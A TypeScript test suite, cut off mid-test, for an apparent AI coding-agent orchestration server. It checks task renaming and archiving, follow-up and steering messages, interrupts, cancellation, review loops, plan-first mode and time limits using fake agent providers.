// Task thread API: rename/archive, follow-ups and steering, project checks, PR status, usage, plan first, checkpoints.
import { execFileSync } from 'node:child_process'
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { AgentEvent, AgentProvider, ProviderKind, RunOptions, TaskId, Workspace } from '@joy/core'
import { ConfigStore } from '@joy/config'
import { openDatabase } from '@joy/db'
import type { Database } from '@joy/db'
import { WorktreeExecutor } from '@joy/executor'
import type { RunInWorktreeInput } from '@joy/executor'
import { REVIEW_SCHEMA } from '@joy/orchestrator'
import { MemoryBackend, Redactor, SecretStore } from '@joy/secrets'
import { afterEach, describe, expect, it } from 'vitest'
import { createJoyServer } from './server.js'
import type { JoyServer, JoyServerOptions } from './server.js'

const TOKEN = 'test-api-token-for-thread-tests-0042'
const servers: JoyServer[] = []
const databases: Database[] = []
const dirs: string[] = []

afterEach(async () => {
  for (const server of servers.splice(0)) await server.close()
  for (const db of databases.splice(0)) if (db.isOpen) db.close()
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

function tempDir(prefix: string): string {
  const dir = mkdtempSync(join(tmpdir(), prefix))
  dirs.push(dir)
  return dir
}

type Gate = { promise: Promise<void>; open: () => void }
function gate(): Gate {
  let open = () => {}
  const promise = new Promise<void>((resolve) => (open = resolve))
  return { promise, open }
}

interface Verdict {
  approve: boolean
  findings?: Array<{ severity: string; message: string }>
}

/**
 * One fake per backend. Reviews (outputSchema) answer from `verdicts` (approve by default); other runs call `work`
 * (to change files or wait) and report usage. With `state.steer` set, implementer runs offer a steer (like Claude's
 * streaming input or Codex `turn/steer`) that records what it got in `steered` and answers `state.steer()`.
 */
function fakeProvider(kind: ProviderKind) {
  const calls: RunOptions[] = []
  const verdicts: Verdict[] = []
  const steered: string[] = []
  const state: {
    work?: ((options: RunOptions, call: number) => Promise<void> | void) | undefined
    reviewWork?: ((options: RunOptions) => Promise<void> | void) | undefined
    steer?: ((text: string) => Promise<boolean> | boolean) | undefined
  } = {}
  const provider: AgentProvider = {
    kind,
    capabilities: {
      codeEdit: true,
      tools: true,
      resume: true,
      presetSessionId: false,
      delegatedApproval: false,
      quotaEvents: false,
      structuredOutput: true,
    },
    async *run(options: RunOptions): AsyncGenerator<AgentEvent> {
      calls.push(options)
      if (options.outputSchema === REVIEW_SCHEMA) {
        await state.reviewWork?.(options)
        const verdict = verdicts.shift() ?? { approve: true }
        yield { type: 'usage', inputTokens: 10, outputTokens: 1 }
        yield {
          type: 'done',
          sessionId: 'review',
          isError: false,
          structured: { approve: verdict.approve, summary: 'review', findings: verdict.findings ?? [] },
        }
        return
      }
      const sessionId = options.resumeSessionId ?? `${kind}-session`
      if (!options.resumeSessionId) yield { type: 'session_started', sessionId }
      const steer = state.steer
      let open = Boolean(steer)
      if (steer)
        options.onSteer?.(async (text) => {
          if (!open || options.signal.aborted) return false
          steered.push(text)
          return steer(text)
        })
      try {
        await state.work?.(options, calls.length)
      } finally {
        if (steer) {
          open = false
          options.onSteer?.(undefined)
        }
      }
      yield { type: 'usage', inputTokens: 100, outputTokens: 20, costUsd: 0.5 }
      yield { type: 'done', sessionId, isError: false, finalMessage: `plan or result ${calls.length}` }
    },
    healthCheck: async () => ({ ok: true, installed: true, loggedIn: true as const }),
  }
  return { provider, calls, verdicts, state, steered }
}

/** A fake executor: one fixed worktree, a diff that always has a change, and scripted check results. */
class FakeExecutor {
  readonly runs: RunInWorktreeInput[] = []
  checkResults: Array<{ exitCode: number; output: string }> = []
  async prepare(repo: Workspace['repo'], taskId: TaskId, attemptId: Workspace['attemptId']) {
    return { repo, taskId, attemptId, path: '/fake/worktree', branch: 'joy/t/a', baseCommit: 'base' }
  }
  async diff() {
    return {
      files: [{ path: 'a.ts', status: 'modified' as const, additions: 1, deletions: 0 }],
      patch: '+a\n',
    }
  }
  async commit() {
    return null
  }
  async cleanup() {}
  async run(_ws: Workspace, input: RunInWorktreeInput) {
    this.runs.push(input)
    const next = this.checkResults.shift() ?? { exitCode: 0, output: 'ok' }
    return { exitCode: next.exitCode, output: next.output, timedOut: false }
  }
}

async function setup(
  options: {
    executor?: JoyServerOptions['executor']
    ghRunner?: JoyServerOptions['ghRunner']
    publisher?: JoyServerOptions['publisher']
    config?: string
    taskTimeLimitMs?: number
  } = {},
) {
  const home = tempDir('joy-thread-')
  writeFileSync(join(home, 'config.yaml'), options.config ?? 'approvals:\n  on_timeout: deny\n')
  const db = openDatabase(':memory:')
  databases.push(db)
  const redactor = new Redactor()
  const claude = fakeProvider('claude-cli')
  const codex = fakeProvider('codex-cli')
  const executor = new FakeExecutor()
  const server = await createJoyServer({
    home,
    database: db,
    configStore: new ConfigStore(join(home, 'config.yaml')),
    secretStore: new SecretStore({ backend: new MemoryBackend(), onSecret: (s) => redactor.add(s) }),
    redactor,
    executor: options.executor ?? executor,
    apiToken: TOKEN,
    approvalTimeoutMs: 2_000,
    cliVersionCheck: false,
    backups: false,
    memoryExtraction: false,
    conversationSummaries: false,
    providers: { 'claude-cli': claude.provider, 'codex-cli': codex.provider },
    ...(options.ghRunner ? { ghRunner: options.ghRunner } : {}),
    ...(options.taskTimeLimitMs ? { taskTimeLimitMs: options.taskTimeLimitMs } : {}),
    ...(options.publisher ? { publisher: options.publisher } : {}),
  })
  servers.push(server)
  const address = await server.listen()
  const origin = `http://127.0.0.1:${address.port}`
  const call = async (method: string, path: string, body?: unknown) => {
    const response = await fetch(`${origin}${path}`, {
      method,
      headers: {
        authorization: `Bearer ${TOKEN}`,
        // State-changing requests must come from the local UI's origin.
        origin: 'http://127.0.0.1:5173',
        ...(body !== undefined ? { 'content-type': 'application/json' } : {}),
      },
      ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
    })
    return { status: response.status, body: (await response.json()) as Record<string, unknown> }
  }
  return { origin, call, db, claude, codex, executor, redactor }
}

type Call = Awaited<ReturnType<typeof setup>>['call']
type Details = {
  task: Record<string, unknown> & { status: string }
  attempts: Array<Record<string, unknown>>
  events: Array<{ type: string; payload: Record<string, unknown>; attemptId?: string }>
  usage: Record<string, unknown>
  pendingPlan: { plan: string } | null
  queuedMessages: unknown[]
  reviews: Array<{ round: number }>
  steerable?: boolean
  interruptible?: boolean
}

async function details(call: Call, id: string): Promise<Details> {
  return (await call('GET', `/api/tasks/${id}`)).body as unknown as Details
}

async function until(call: Call, id: string, check: (d: Details) => boolean, what: string): Promise<Details> {
  const deadline = Date.now() + 10_000
  let last: Details | undefined
  while (Date.now() < deadline) {
    last = await details(call, id)
    if (check(last)) return last
    await new Promise((resolve) => setTimeout(resolve, 10))
  }
  throw new Error(`Timed out waiting for ${what} (status ${last?.task.status})`)
}

const settled = (status: string) => (d: Details) => d.task.status === status
const count = (d: Details, type: string) => d.events.filter((event) => event.type === type).length

async function newRepo(call: Call, path = '/tmp/thread-repo', extra: object = {}) {
  const { body } = await call('POST', '/api/repos', { path, defaultBranch: 'main', ...extra })
  return (body.repo as { id: string }).id
}

async function newTask(call: Call, repoId: string, extra: object = {}) {
  const { status, body } = await call('POST', '/api/tasks', {
    repoId,
    title: 'Fix add()',
    prompt: 'Fix add()',
    mode: 'single',
    ...extra,
  })
  expect(status).toBe(201)
  return (body.task as { id: string }).id
}

describe('task rename, archive and details', () => {
  it('renames and archives tasks, hides archived ones by default and exposes branch, times and usage', async () => {
    const { call } = await setup()
    const repoId = await newRepo(call)
    const id = await newTask(call, repoId)
    const done = await until(call, id, settled('done'), 'done')
    expect(done.attempts[0]).toMatchObject({ branch: 'joy/t/a', worktreePath: '/fake/worktree' })
    expect(done.task).toMatchObject({
      createdAt: expect.any(String),
      updatedAt: expect.any(String),
      archived: false,
    })
    expect(done.usage).toMatchObject({
      inputTokens: 100,
      outputTokens: 20,
      costUsd: 0.5,
      byProvider: [{ provider: 'claude-cli', inputTokens: 100, outputTokens: 20, costUsd: 0.5 }],
    })
    expect(done.usage.durationMs).toEqual(expect.any(Number))

    expect((await call('PATCH', `/api/tasks/${id}`, {})).status).toBe(400)
    expect((await call('PATCH', `/api/tasks/${id}`, { title: '' })).status).toBe(400)
    const renamed = await call('PATCH', `/api/tasks/${id}`, { title: 'Sum numbers' })
    expect(renamed).toMatchObject({ status: 200, body: { task: { title: 'Sum numbers', archived: false } } })
    expect((await call('PATCH', `/api/tasks/${id}`, { archived: true })).body.task).toMatchObject({
      archived: true,
    })
    expect(((await call('GET', '/api/tasks')).body.tasks as unknown[]).length).toBe(0)
    expect((await call('GET', '/api/tasks?archived=1')).body.tasks).toMatchObject([{ id, archived: true }])
    expect((await details(call, id)).events.filter((e) => e.type === 'task.updated')).toHaveLength(2)
    expect((await call('PATCH', '/api/tasks/missing', { title: 'x' })).status).toBe(404)
  })

  it('refuses to archive a running task', async () => {
    const { call, claude } = await setup()
    const wait = gate()
    claude.state.work = () => wait.promise
    const id = await newTask(call, await newRepo(call))
    await until(call, id, settled('running'), 'running')
    expect((await call('PATCH', `/api/tasks/${id}`, { archived: true })).status).toBe(409)
    wait.open()
    await until(call, id, settled('done'), 'done')
  })
})

describe('follow-up messages and steering', () => {
  it('continues a finished single task in the same session with the owner message', async () => {
    const { call, claude } = await setup()
    const id = await newTask(call, await newRepo(call))
    await until(call, id, settled('done'), 'done')
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Also handle negative numbers' })
    expect(sent).toMatchObject({ status: 202, body: { message: { delivery: 'follow_up' } } })
    const after = await until(
      call,
      id,
      (d) => d.task.status === 'done' && count(d, 'result') === 2,
      'follow-up',
    )
    expect(claude.calls).toHaveLength(2)
    expect(claude.calls[1]).toMatchObject({ resumeSessionId: 'claude-cli-session', cwd: '/fake/worktree' })
    expect(claude.calls[1]?.prompt).toContain('Also handle negative numbers')
    expect(after.events.find((e) => e.type === 'user.message')?.payload).toMatchObject({
      text: 'Also handle negative numbers',
      provenance: 'user',
      delivery: 'follow_up',
    })
    expect((await call('POST', `/api/tasks/${id}/messages`, { text: '' })).status).toBe(400)
  })

  it('reruns the review loop after a follow-up, with later round numbers and the instruction for the reviewer', async () => {
    const { call, claude, codex } = await setup()
    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
    await until(call, id, settled('done'), 'done')
    await call('POST', `/api/tasks/${id}/messages`, { text: 'Rename add to sum' })
    const after = await until(call, id, (d) => d.task.status === 'done' && d.reviews.length === 2, 'rereview')
    expect(after.reviews.map((review) => review.round)).toEqual([1, 2])
    expect(claude.calls[1]?.prompt).toContain('Rename add to sum')
    expect(codex.calls[1]?.prompt).toContain('Rename add to sum')
  })

  it('queues a message while running and delivers it at the next fix round', async () => {
    const { call, claude, codex } = await setup()
    const wait = gate()
    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
    codex.verdicts.push({ approve: false, findings: [{ severity: 'major', message: 'handle NaN' }] })
    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
    await until(call, id, settled('running'), 'running')
    const sent = await call('POST', `/api/tasks/${id}/messages`, {
      text: 'Keep the public API',
      interrupt: false,
    })
    expect(sent.body.message).toMatchObject({ delivery: 'queued' })
    expect((await details(call, id)).queuedMessages).toHaveLength(1)
    wait.open()
    const done = await until(call, id, settled('done'), 'done')
    expect(claude.calls[1]?.prompt).toContain('handle NaN')
    expect(claude.calls[1]?.prompt).toContain('- Keep the public API')
    expect(done.events.find((e) => e.type === 'user.message.delivered')?.payload).toMatchObject({
      via: 'next_turn',
    })
    expect(done.queuedMessages).toEqual([])
  })

  it('continues a single task right after the run when a message arrived too late for it', async () => {
    const { call, claude } = await setup()
    const wait = gate()
    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
    const id = await newTask(call, await newRepo(call))
    await until(call, id, settled('running'), 'running')
    await call('POST', `/api/tasks/${id}/messages`, { text: 'Add a changelog entry', interrupt: false })
    wait.open()
    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'auto follow-up')
    expect(claude.calls[1]).toMatchObject({ resumeSessionId: 'claude-cli-session' })
    expect(claude.calls[1]?.prompt).toContain('Add a changelog entry')
  })

  it('discards queued messages when the task is cancelled, and refuses compete tasks', async () => {
    const { call, claude } = await setup()
    claude.state.work = (options) =>
      new Promise((resolve) => options.signal.addEventListener('abort', () => resolve(), { once: true }))
    const id = await newTask(call, await newRepo(call))
    await until(call, id, settled('running'), 'running')
    await call('POST', `/api/tasks/${id}/messages`, { text: 'never mind', interrupt: false })
    await call('POST', `/api/tasks/${id}/cancel`)
    const cancelled = await until(call, id, (d) => count(d, 'user.message.discarded') === 1, 'discard')
    expect(cancelled.task.status).toBe('cancelled')

    claude.state.work = undefined
    const competeId = await newTask(call, await newRepo(call, '/tmp/thread-compete'), { mode: 'compete' })
    expect((await call('POST', `/api/tasks/${competeId}/messages`, { text: 'hi' })).status).toBe(409)
    const ended = await until(
      call,
      competeId,
      (d) => !['queued', 'running'].includes(d.task.status),
      'compete',
    )
    expect((await call('POST', `/api/tasks/${competeId}/messages`, { text: 'hi' })).status).toBe(409)
    expect(ended.events.some((e) => e.type === 'user.message')).toBe(false)
  })
})

/** Work that runs until it is stopped; with `release`, it only stops once the gate opens (a slow-to-stop CLI). */
const untilAborted = (options: RunOptions, release?: Gate) =>
  new Promise<void>((resolve) =>
    options.signal.addEventListener(
      'abort',
      () => void (release ? release.promise.then(resolve) : resolve()),
      {
        once: true,
      },
    ),
  )
const deliveredIds = (d: Details) =>
  d.events.filter((e) => e.type === 'user.message.delivered').flatMap((e) => e.payload.ids as string[])

describe('steering a running agent with a message (default)', () => {
  it('hands the message to the working agent without stopping it', async () => {
    const { call, claude } = await setup()
    claude.state.steer = () => true
    const wait = gate()
    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
    const id = await newTask(call, await newRepo(call))
    const working = await until(call, id, (d) => d.steerable === true, 'steerable')
    expect(working).toMatchObject({ interruptible: true })
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Use BigInt instead' })
    expect(sent).toMatchObject({ status: 202, body: { message: { delivery: 'steer' } } })
    expect(claude.steered).toHaveLength(1)
    expect(claude.steered[0]).toContain('Use BigInt instead')
    expect(claude.steered[0]).toContain('You were not stopped')
    expect(claude.steered[0]).toContain('If it is a question, answer it briefly first')
    expect(claude.calls[0]?.signal.aborted).toBe(false)
    wait.open()
    const done = await until(call, id, settled('done'), 'done')
    // One run, one result: no interrupt, no follow-up.
    expect(claude.calls).toHaveLength(1)
    expect(count(done, 'result')).toBe(1)
    expect(count(done, 'run.interrupted')).toBe(0)
    expect(done.events.find((e) => e.type === 'user.message')?.payload).toMatchObject({
      text: 'Use BigInt instead',
      provenance: 'user',
      delivery: 'steer',
    })
    expect(done.events.find((e) => e.type === 'user.message.delivered')?.payload).toMatchObject({
      ids: [(sent.body.message as { id: string }).id],
      via: 'steer',
    })
    expect(done.events.filter((e) => e.type === 'steer.available').map((e) => e.payload.available)).toEqual([
      true,
      false,
    ])
    expect(done).toMatchObject({ steerable: false, queuedMessages: [] })
  })

  it('steers several messages in a row, each delivered once', async () => {
    const { call, claude } = await setup()
    claude.state.steer = () => true
    const wait = gate()
    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.steerable === true, 'steerable')
    const first = await call('POST', `/api/tasks/${id}/messages`, { text: 'first note' })
    const second = await call('POST', `/api/tasks/${id}/messages`, { text: 'second note' })
    expect([first, second].map((r) => (r.body.message as { delivery: string }).delivery)).toEqual([
      'steer',
      'steer',
    ])
    wait.open()
    const done = await until(call, id, settled('done'), 'done')
    expect(claude.steered.map((text) => text.split('\n').at(-1))).toEqual(['first note', 'second note'])
    expect(deliveredIds(done)).toEqual([first, second].map((r) => (r.body.message as { id: string }).id))
    expect(claude.calls).toHaveLength(1)
  })

  it('queues without stopping the agent when its backend cannot steer', async () => {
    const { call, claude } = await setup()
    const wait = gate()
    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
    const id = await newTask(call, await newRepo(call))
    const working = await until(
      call,
      id,
      (d) => d.task.status === 'running' && claude.calls.length === 1,
      'running',
    )
    expect(working.steerable).toBe(false)
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'later please' })
    expect(sent.body.message).toMatchObject({ delivery: 'queued' })
    expect(claude.calls[0]?.signal.aborted).toBe(false)
    wait.open()
    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'follow-up')
    expect(claude.calls[1]?.prompt).toContain('later please')
  })

  it('falls back to the queue when the steer fails, and delivers at the next turn', async () => {
    const { call, claude } = await setup()
    claude.state.steer = () => false
    const wait = gate()
    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.steerable === true, 'steerable')
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Rename it' })
    expect(sent.body.message).toMatchObject({ delivery: 'queued' })
    const queued = await details(call, id)
    expect(queued.queuedMessages).toEqual([
      { id: (sent.body.message as { id: string }).id, text: 'Rename it' },
    ])
    expect(queued.events.find((e) => e.type === 'user.message.requeued')?.payload).toMatchObject({
      reason: 'steer_failed',
    })
    wait.open()
    const done = await until(
      call,
      id,
      (d) => d.task.status === 'done' && count(d, 'result') === 2,
      'follow-up',
    )
    expect(claude.calls[1]?.prompt).toContain('Rename it')
    expect(deliveredIds(done)).toEqual([(sent.body.message as { id: string }).id])
  })

  it('continues with the message when the run ended while the steer was failing', async () => {
    const { call, claude } = await setup()
    const wait = gate()
    claude.state.work = (_options, n) => (n === 1 ? wait.promise : undefined)
    // The run finishes while the steer is still in flight; then the backend reports it could not take it.
    claude.state.steer = async () => {
      wait.open()
      await new Promise((resolve) => setTimeout(resolve, 100))
      return false
    }
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.steerable === true, 'steerable')
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'Too late for this turn' })
    expect(sent.body.message).toMatchObject({ delivery: 'queued' })
    await until(call, id, (d) => d.task.status === 'done' && count(d, 'result') === 2, 'follow-up')
    expect(claude.calls[1]?.prompt).toContain('Too late for this turn')
  })

  it('lets a cancel win over a steer in flight and withdraws the message', async () => {
    const { call, claude } = await setup()
    const steering = gate()
    const answer = gate()
    claude.state.steer = async () => {
      steering.open()
      await answer.promise
      return false
    }
    claude.state.work = (options) => untilAborted(options)
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.steerable === true, 'steerable')
    const sending = call('POST', `/api/tasks/${id}/messages`, { text: 'never mind' })
    await steering.promise
    expect((await call('POST', `/api/tasks/${id}/cancel`)).status).toBe(200)
    await until(call, id, settled('cancelled'), 'cancelled')
    answer.open()
    const sent = await sending
    expect(sent.body.message).toMatchObject({ delivery: 'queued' })
    const cancelled = await until(call, id, (d) => count(d, 'user.message.discarded') === 1, 'discard')
    expect(cancelled.task.status).toBe('cancelled')
    expect(claude.calls).toHaveLength(1)
    expect(count(cancelled, 'user.message.delivered')).toBe(0)
  })

  it('steers the implementer in a review loop but lets messages wait during the review', async () => {
    const { call, claude, codex } = await setup()
    claude.state.steer = () => true
    const implementing = gate()
    const reviewing = gate()
    const finishReview = gate()
    claude.state.work = (_options, n) => (n === 1 ? implementing.promise : undefined)
    codex.verdicts.push({ approve: false, findings: [{ severity: 'major', message: 'handle NaN' }] })
    codex.state.reviewWork = () => {
      if (codex.calls.length !== 1) return undefined
      reviewing.open()
      return finishReview.promise
    }
    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
    await until(call, id, (d) => d.steerable === true, 'steerable')
    const steered = await call('POST', `/api/tasks/${id}/messages`, { text: 'Keep it in one file' })
    expect(steered.body.message).toMatchObject({ delivery: 'steer' })
    implementing.open()
    await reviewing.promise
    expect(await details(call, id)).toMatchObject({ steerable: false })
    const waiting = await call('POST', `/api/tasks/${id}/messages`, { text: 'Also add a test' })
    expect(waiting.body.message).toMatchObject({ delivery: 'queued' })
    finishReview.open()
    await until(call, id, settled('done'), 'done')
    expect(claude.steered).toHaveLength(1)
    // The waiting message went with the fix round; the reviewer was never steered.
    expect(claude.calls[1]?.prompt).toContain('Also add a test')
    expect(codex.calls.every((options) => options.onSteer === undefined)).toBe(true)
    expect(codex.calls[0]?.prompt).toContain('Keep it in one file')
  })
})

describe('interrupting a running task with a message (interrupt: true)', () => {
  it('stops the current turn and continues the same session with the message, without cancelling the task', async () => {
    const { call, claude } = await setup()
    claude.state.work = (options, n) => (n === 1 ? untilAborted(options) : undefined)
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'running')
    const sent = await call('POST', `/api/tasks/${id}/messages`, {
      text: 'Use BigInt instead',
      interrupt: true,
    })
    expect(sent).toMatchObject({ status: 202, body: { message: { delivery: 'interrupt' } } })
    const done = await until(call, id, settled('done'), 'done after the interrupt')
    expect(claude.calls[0]?.signal.aborted).toBe(true)
    expect(claude.calls).toHaveLength(2)
    expect(claude.calls[1]).toMatchObject({ resumeSessionId: 'claude-cli-session', cwd: '/fake/worktree' })
    expect(claude.calls[1]?.prompt).toContain('The owner interrupted your previous step')
    expect(claude.calls[1]?.prompt).toContain('Use BigInt instead')
    // One run was interrupted, not cancelled: a single result, and the timeline says why the run stopped.
    const types = done.events.map((e) => e.type)
    expect(done.events.filter((e) => e.type === 'result').map((e) => e.payload.status)).toEqual(['succeeded'])
    expect(types.filter((t) => t === 'run.interrupted')).toHaveLength(1)
    expect(types.filter((t) => t === 'started')).toHaveLength(2)
    expect(types.indexOf('run.interrupted')).toBeLessThan(types.lastIndexOf('started'))
    expect(done.events.find((e) => e.type === 'user.message')?.payload).toMatchObject({
      delivery: 'interrupt',
    })
    expect(done.events.find((e) => e.type === 'user.message.delivered')?.payload).toMatchObject({
      via: 'interrupt',
    })
    expect(done.attempts).toHaveLength(1)
    expect(done.attempts[0]).toMatchObject({ status: 'succeeded' })
    expect(done.queuedMessages).toEqual([])
  })

  it('delivers two quick messages once each, in the same continuation', async () => {
    const { call, claude } = await setup()
    const release = gate()
    claude.state.work = (options, n) => (n === 1 ? untilAborted(options, release) : undefined)
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'running')
    const first = await call('POST', `/api/tasks/${id}/messages`, { text: 'first note', interrupt: true })
    const second = await call('POST', `/api/tasks/${id}/messages`, { text: 'second note', interrupt: true })
    expect(first.body.message).toMatchObject({ delivery: 'interrupt' })
    expect(second.body.message).toMatchObject({ delivery: 'interrupt' })
    expect((await details(call, id)).task.status).toBe('running')
    release.open()
    const done = await until(call, id, settled('done'), 'done')
    expect(claude.calls).toHaveLength(2)
    expect(claude.calls[1]?.prompt).toContain('first note')
    expect(claude.calls[1]?.prompt).toContain('second note')
    const ids = [first.body.message, second.body.message].map((m) => (m as { id: string }).id)
    expect(deliveredIds(done).sort()).toEqual([...ids].sort())
    expect(count(done, 'user.message.delivered')).toBe(1)
    expect(count(done, 'run.interrupted')).toBe(1)
  })

  it('lets a cancel win over an interrupt that is still stopping, and withdraws the message', async () => {
    const { call, claude } = await setup()
    const release = gate()
    claude.state.work = (options, n) => (n === 1 ? untilAborted(options, release) : undefined)
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'running')
    const sent = await call('POST', `/api/tasks/${id}/messages`, { text: 'actually stop', interrupt: true })
    expect(sent.body.message).toMatchObject({ delivery: 'interrupt' })
    expect((await call('POST', `/api/tasks/${id}/cancel`)).status).toBe(200)
    release.open()
    const cancelled = await until(call, id, (d) => count(d, 'user.message.discarded') === 1, 'discard')
    expect(cancelled.task.status).toBe('cancelled')
    expect(claude.calls).toHaveLength(1)
    expect(count(cancelled, 'user.message.delivered')).toBe(0)
    expect(count(cancelled, 'run.interrupted')).toBe(0)
    expect(cancelled.events.find((e) => e.type === 'user.message.discarded')?.payload).toMatchObject({
      ids: [(sent.body.message as { id: string }).id],
    })
  })

  it('interrupts the implementer in a review loop, then reviews the continued work with the message in the brief', async () => {
    const { call, claude, codex } = await setup()
    claude.state.work = (options, n) => (n === 1 ? untilAborted(options) : undefined)
    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'implementing')
    const sent = await call('POST', `/api/tasks/${id}/messages`, {
      text: 'Keep it in one file',
      interrupt: true,
    })
    expect(sent.body.message).toMatchObject({ delivery: 'interrupt' })
    const done = await until(call, id, settled('done'), 'done')
    expect(claude.calls).toHaveLength(2)
    expect(claude.calls[1]).toMatchObject({ resumeSessionId: 'claude-cli-session' })
    expect(claude.calls[1]?.prompt).toContain('Keep it in one file')
    // The interrupted turn was never reviewed; the continued one was, with the owner's message in the task brief.
    expect(codex.calls).toHaveLength(1)
    expect(codex.calls[0]?.prompt).toContain('Keep it in one file')
    expect(done.reviews.map((review) => review.round)).toEqual([1])
    expect(done.events.filter((e) => e.type === 'result').map((e) => e.payload.status)).toEqual(['succeeded'])
  })

  it('does not interrupt a review: the message waits and reaches the implementer afterwards', async () => {
    const { call, claude, codex } = await setup()
    const reviewing = gate()
    const finishReview = gate()
    codex.state.reviewWork = () => {
      if (codex.calls.length !== 1) return undefined
      reviewing.open()
      return finishReview.promise
    }
    const id = await newTask(call, await newRepo(call), { mode: 'review_loop' })
    await reviewing.promise
    const sent = await call('POST', `/api/tasks/${id}/messages`, {
      text: 'Also update the README',
      interrupt: true,
    })
    expect(sent.body.message).toMatchObject({ delivery: 'queued' })
    finishReview.open()
    const done = await until(
      call,
      id,
      (d) => d.task.status === 'done' && d.reviews.length === 2,
      'follow-up after the review',
    )
    expect(codex.calls[0]?.signal.aborted).toBe(false)
    expect(claude.calls).toHaveLength(2)
    expect(claude.calls[1]?.prompt).toContain('Also update the README')
    expect(count(done, 'run.interrupted')).toBe(0)
    expect(done.events.find((e) => e.type === 'user.message.delivered')?.payload).toMatchObject({
      via: 'follow_up',
    })
  })

  it('keeps writing a plan after an interrupt, still read-only, and then waits for approval', async () => {
    const { call, claude } = await setup()
    claude.state.work = (options, n) => (n === 1 ? untilAborted(options) : undefined)
    const id = await newTask(call, await newRepo(call), { planFirst: true })
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'planning')
    const sent = await call('POST', `/api/tasks/${id}/messages`, {
      text: 'Plan for Windows too',
      interrupt: true,
    })
    expect(sent.body.message).toMatchObject({ delivery: 'interrupt' })
    const waiting = await until(call, id, (d) => d.pendingPlan !== null, 'plan')
    expect(waiting.task.status).toBe('review_ready')
    expect(claude.calls).toHaveLength(2)
    expect(claude.calls[1]).toMatchObject({ resumeSessionId: 'claude-cli-session', autonomy: 'read-only' })
    expect(claude.calls[1]?.prompt).toContain('Do not change any files yet')
    expect(claude.calls[1]?.prompt).toContain('Plan for Windows too')
  })

  it('continues after a provider that throws when it is stopped', async () => {
    const { call, claude } = await setup()
    claude.state.work = async (options, n) => {
      if (n !== 1) return
      await untilAborted(options)
      throw new Error('the CLI was killed')
    }
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'running')
    await call('POST', `/api/tasks/${id}/messages`, { text: 'Rename it', interrupt: true })
    const done = await until(call, id, settled('done'), 'done')
    expect(claude.calls).toHaveLength(2)
    expect(claude.calls[1]?.prompt).toContain('Rename it')
    expect(count(done, 'run.interrupted')).toBe(1)
    expect(count(done, 'error')).toBe(0)
    expect(done.events.filter((e) => e.type === 'result').map((e) => e.payload.status)).toEqual(['succeeded'])
  })

  it('interrupts a fix round and only gives the continued run the rounds that were left', async () => {
    const { call, claude, codex } = await setup()
    const reject = { approve: false, findings: [{ severity: 'major', message: 'still wrong' }] }
    codex.verdicts.push(reject, reject, reject, reject)
    claude.state.work = (options, n) => (n === 2 ? untilAborted(options) : undefined)
    const id = await newTask(call, await newRepo(call), { mode: 'review_loop', maxRounds: 2 })
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 2, 'fix round')
    const sent = await call('POST', `/api/tasks/${id}/messages`, {
      text: 'Try a lookup table',
      interrupt: true,
    })
    expect(sent.body.message).toMatchObject({ delivery: 'interrupt' })
    const ended = await until(call, id, settled('review_ready'), 'review_ready')
    expect(claude.calls).toHaveLength(3)
    expect(claude.calls[2]?.prompt).toContain('Try a lookup table')
    // Round 1 reviewed, round 2 interrupted and done again, then reviewed: two reviews in all, not four.
    expect(ended.reviews.map((review) => review.round)).toEqual([1, 2])
    expect(codex.calls).toHaveLength(2)
  })

  it('keeps the time limit across interrupts: the task stops at the limit however often it is interrupted', async () => {
    const { call, claude } = await setup({ taskTimeLimitMs: 400 })
    claude.state.work = (options) => untilAborted(options)
    const startedAt = Date.now()
    const id = await newTask(call, await newRepo(call))
    await until(call, id, (d) => d.task.status === 'running' && claude.calls.length === 1, 'running')
    const failed = (d: Details) => d.events.some((e) => e.type === 'result' && e.payload.status === 'failed')
    let last = await details(call, id)
    while (!failed(last) && Date.now() - startedAt < 3_000) {
      if (last.task.status === 'running')
        await call('POST', `/api/tasks/${id}/messages`, { text: 'keep going', interrupt: true })
      await new Promise((resolve) => setTimeout(resolve, 250))
      last = await details(call, id)
    }
    expect(failed(last)).toBe(true)
    expect(Date.now() - startedAt).toBeLessThan(2_000)
    expect(last.events.find((e) => e.type === 'result')?.payload.reason).toContain('ran longer than')
    expect(count(last, 'run.interrupted')).toBeGreaterThanOrEqual(1)
  })

  it('puts the message back in the queue when a limit stops the run before the interrupt', async () => {
    const { call, claude } = await setup({ taskTimeLimitMs: 300 })
    const release = gate()
    claude.state.work = (options, n) => (n === 1 ? untilAborted(options, release) : undefined)
